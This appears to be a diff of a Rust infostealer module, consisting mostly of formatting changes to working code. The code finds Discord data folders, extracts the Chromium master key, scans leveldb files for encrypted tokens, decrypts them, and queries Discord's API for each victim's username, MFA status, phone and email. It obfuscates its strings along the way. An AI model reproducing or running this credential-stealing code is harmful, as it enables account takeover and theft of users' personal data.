@@ -7,7 +7,7 @@ use collector::{Collector, Software};
 use core::fmt::{Display, Formatter};
 use obfstr::obfstr as s;
 use requests::{Request, RequestBuilder, ResponseBodyExt};
-use tasks::{impl_composite_task_runner, parent_name, CompositeTask, Task};
+use tasks::{CompositeTask, Task, impl_composite_task_runner, parent_name};
 use utils::base64::base64_decode;
 use utils::browsers::chromium;
 use utils::browsers::chromium::extract_master_key;
@@ -20,7 +20,7 @@ struct TokenValidationTask {
 impl<C: Collector> Task<C> for TokenValidationTask {
     fn run(&self, parent: &Path, collector: &C) {
         let Some(info) = get_token_info(self.token.clone()) else {
-            return
+            return;
         };
 
         collector.get_software().increase_discord_tokens();
@@ -32,19 +32,19 @@ impl<C: Collector> Task<C> for TokenValidationTask {
 }
 
 struct TokenWriterTask<C: Collector> {
-    inner: CompositeTask<C>
+    inner: CompositeTask<C>,
 }
 
 impl<C: Collector> TokenWriterTask<C> {
     fn new(tokens: Vec<String>) -> Self {
         let tokens: Vec<Arc<dyn Task<C>>> = tokens
             .into_iter()
-            .map(|token| TokenValidationTask{ token })
+            .map(|token| TokenValidationTask { token })
             .map(|task| Arc::new(task) as Arc<dyn Task<C>>)
             .collect();
 
         Self {
-            inner: CompositeTask::new(tokens)
+            inner: CompositeTask::new(tokens),
         }
     }
 }
@@ -60,9 +60,9 @@ impl<C: Collector> Task<C> for DiscordTask {
         let mut tokens = collect_tokens(&get_discord_paths());
         tokens.sort();
         tokens.dedup();
-        
+
         if tokens.is_empty() {
-            return
+            return;
         }
 
         TokenWriterTask::new(tokens).run(parent, collector);
@@ -85,14 +85,14 @@ fn collect_tokens(paths: &[Path]) -> Vec<String> {
 
     for path in paths {
         if !path.is_exists() {
-            continue
+            continue;
         }
 
         if let Some(master_key) = unsafe { extract_master_key(path) } {
             let scan_path = path / s!("Local Storage") / s!("leveldb");
 
             if !(scan_path.is_exists() && scan_path.is_dir()) {
-                continue
+                continue;
             }
 
             if let Some(tokens) = scan_tokens(&scan_path, &master_key) {
@@ -108,22 +108,22 @@ fn scan_tokens(scan_path: &Path, master_key: &[u8]) -> Option<Vec<String>> {
     let mut result = Vec::new();
 
     let scannable = scan_path.list_files_filtered(&|file| {
-        file.extension().map(|ext| {
-            ext == s!("ldb") || ext == s!("log")
-        }).unwrap_or(false)
+        file.extension()
+            .map(|ext| ext == s!("ldb") || ext == s!("log"))
+            .unwrap_or(false)
     })?;
 
     for entry in scannable {
         let content = entry.read_file().unwrap();
         let encrypted_tokens = extract_encrypted_token_strings(&content);
-        
+
         for encrypted_token in encrypted_tokens {
             if let Some(decrypted) = decrypt_token(encrypted_token, &master_key) {
                 result.push(decrypted);
             }
         }
     }
-    
+
     Some(result)
 }
 
@@ -138,7 +138,7 @@ fn extract_encrypted_token_strings(input: &[u8]) -> Vec<&[u8]> {
     const PREFIX: &[u8] = b"dQw4w9WgXcQ:";
     const MAX_LOOKAHEAD: usize = 500;
     let mut result = Vec::new();
-    
+
     let mut i = 0;
     while i <= input.len().saturating_sub(PREFIX.len()) {
         if &input[i..i + PREFIX.len()] == PREFIX {
@@ -159,7 +159,7 @@ fn extract_encrypted_token_strings(input: &[u8]) -> Vec<&[u8]> {
             i += 1;
         }
     }
-    
+
     result
 }
 
@@ -169,14 +169,12 @@ struct TokenInfo {
     mfa: bool,
     phone: Option<String>,
     email: Option<String>,
-    flags: u32,
-    public_flags: u32,
 }
 
 impl Display for TokenInfo {
     fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
         write!(
-            f, 
+            f,
             "Token: {}\n\
             Username: {}\n\
             Phone: {}\n\
@@ -194,13 +192,17 @@ impl Display for TokenInfo {
 fn get_token_info(token: String) -> Option<TokenInfo> {
     let resp = Request::get("https://discord.com/api/v9/users/@me")
         .header("Authorization", &token)
-        .header("User-Agent", s!("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0"))
+        .header(
+            "User-Agent",
+            s!("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0"),
+        )
         .header("Referer", "https://discord.com/channels/@me")
         .build()
-        .send().ok()?;
+        .send()
+        .ok()?;
 
     if resp.status_code() != 200 {
-        return None
+        return None;
     }
 
     let json = resp.body().as_json().ok()?;
@@ -211,7 +213,5 @@ fn get_token_info(token: String) -> Option<TokenInfo> {
         mfa: *json.get("mfa_enabled")?.as_bool()?,
         phone: json.get("phone")?.as_string().map(|s| s.to_owned()),
         email: json.get("email")?.as_string().map(|s| s.to_owned()),
-        flags: *json.get("flags")?.as_number()? as u32,
-        public_flags: *json.get("public_flags")?.as_number()? as u32,
     })
 }
